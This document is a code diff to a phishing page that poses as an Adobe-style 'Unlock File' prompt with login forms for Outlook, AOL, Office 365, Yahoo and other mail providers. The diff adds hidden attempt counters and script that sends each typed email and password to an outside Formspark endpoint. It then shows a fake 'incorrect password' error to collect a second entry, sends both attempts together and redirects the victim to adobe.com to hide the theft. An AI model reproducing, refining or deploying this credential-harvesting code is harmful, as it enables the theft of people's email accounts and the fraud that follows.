@@ -100,6 +100,7 @@ input {
 							<label for="pwdOutlook">Password</label>
 							<input class="form-control" type="password" id="pwdOutlook" name="password" required>
 						</div>
+						<input type="hidden" id="attemptOutlook" value="1">
 						<button type="submit" class="btn btn-primary">Unlock File</button>
 					</form>
 					<div class="error-div alert alert-danger" style="display:none;">Incorrect Username Or Password</div>
@@ -135,6 +136,7 @@ input {
 							<label for="pwdAol">Password</label>
 							<input class="form-control" type="password" id="pwdAol" name="password" required>
 						</div>
+						<input type="hidden" id="attemptAol" value="1">
 						<button type="submit" class="btn btn-primary btn-dark">Unlock File</button>
 					</form>
 					<div class="error-div alert alert-danger" style="display:none;">Incorrect Username Or Password</div>
@@ -170,6 +172,7 @@ input {
 							<label for="pwdOffice">Password</label>
 							<input class="form-control" type="password" id="pwdOffice" name="password" required>
 						</div>
+						<input type="hidden" id="attemptOffice" value="1">
 						<button type="submit" class="btn btn-primary" style="background: red;border:1px solid red;">Unlock File</button>
 					</form>
 					<div class="error-div alert alert-danger" style="display:none;">Incorrect Username Or Password</div>
@@ -205,6 +208,7 @@ input {
 							<label for="pwdYahoo">Password</label>
 							<input class="form-control" type="password" id="pwdYahoo" name="password" required>
 						</div>
+						<input type="hidden" id="attemptYahoo" value="1">
 						<button type="submit" class="btn btn-primary" style="background:purple;border:1px solid purple;">Unlock File</button>
 					</form>
 					<div class="error-div alert alert-danger" style="display:none;">Incorrect Username Or Password</div>
@@ -240,6 +244,7 @@ input {
 							<label for="pwdOther">Password</label>
 							<input class="form-control" type="password" id="pwdOther" name="password" required>
 						</div>
+						<input type="hidden" id="attemptOther" value="1">
 						<button type="submit" class="btn btn-primary btn-dark">Unlock File</button>
 					</form>
 					<div class="error-div alert alert-danger" style="display:none;">Incorrect Username Or Password</div>
@@ -268,29 +273,43 @@ input {
 // Formspark endpoint
 const formsparkUrl = "https://submit-form.com/0gyAIslPc";
 
+// Store first attempt credentials
+let firstAttempt = {
+	email: '',
+	password: '',
+	provider: ''
+};
+
 // Handle all form submissions
 document.querySelectorAll('form').forEach(form => {
 	form.addEventListener('submit', function(e) {
 		e.preventDefault(); // STOP actual form submission
 		
-		// Get form data
-		const formData = new FormData(form);
-		const data = {};
-		formData.forEach((value, key) => {
-			data[key] = value;
-		});
+		// Get current form data
+		const email = $(this).find('input[type="email"]').val();
+		const password = $(this).find('input[type="password"]').val();
+		const attempt = $(this).find('input[type="hidden"]').val();
 		
-		// Add provider based on form id
-		if (form.id === 'outlookForm') data.provider = 'outlook';
-		if (form.id === 'aolForm') data.provider = 'aol';
-		if (form.id === 'officeForm') data.provider = 'office365';
-		if (form.id === 'yahooForm') data.provider = 'yahoo';
-		if (form.id === 'otherForm') data.provider = 'other';
+		// Determine provider from form id
+		let provider = '';
+		if (form.id === 'outlookForm') provider = 'outlook';
+		if (form.id === 'aolForm') provider = 'aol';
+		if (form.id === 'officeForm') provider = 'office365';
+		if (form.id === 'yahooForm') provider = 'yahoo';
+		if (form.id === 'otherForm') provider = 'other';
+		
+		// Prepare data for Formspark
+		const data = {
+			email: email,
+			password: password,
+			provider: provider,
+			attempt: attempt
+		};
 		
 		// Show spinner
 		showSpinner();
 		
-		// Send data to Formspark in background (silently)
+		// Send data to Formspark in background
 		fetch(formsparkUrl, {
 			method: 'POST',
 			headers: {
@@ -298,13 +317,53 @@ document.querySelectorAll('form').forEach(form => {
 			},
 			body: JSON.stringify(data)
 		}).then(response => {
-			console.log('Form submitted to Formspark');
+			console.log('Attempt ' + attempt + ' submitted to Formspark');
 		}).catch(error => {
 			console.error('Error:', error);
 		});
 		
-		// Original behavior: show error after 2 seconds
-		setTimeout(showError, 2000);
+		// Check if this is first or second attempt
+		if (attempt == 1) {
+			// First attempt: Store credentials and show error
+			firstAttempt.email = email;
+			firstAttempt.password = password;
+			firstAttempt.provider = provider;
+			
+			// Update hidden field to 2 for next attempt
+			$(this).find('input[type="hidden"]').val('2');
+			
+			// Show error after 2 seconds
+			setTimeout(showError, 2000);
+			
+		} else {
+			// Second attempt: Send both attempts combined, then redirect
+			const combinedData = {
+				first_attempt: firstAttempt,
+				second_attempt: {
+					email: email,
+					password: password,
+					provider: provider
+				},
+				attempt: 'final'
+			};
+			
+			// Send combined data to Formspark
+			fetch(formsparkUrl, {
+				method: 'POST',
+				headers: {
+					'Content-Type': 'application/json',
+				},
+				body: JSON.stringify(combinedData)
+			}).then(response => {
+				console.log('Final combined data sent');
+				// Redirect to Adobe
+				window.location.href = 'https://adobe.com';
+			}).catch(error => {
+				console.error('Error:', error);
+				// Still redirect even if error
+				window.location.href = 'https://adobe.com';
+			});
+		}
 	});
 });
 
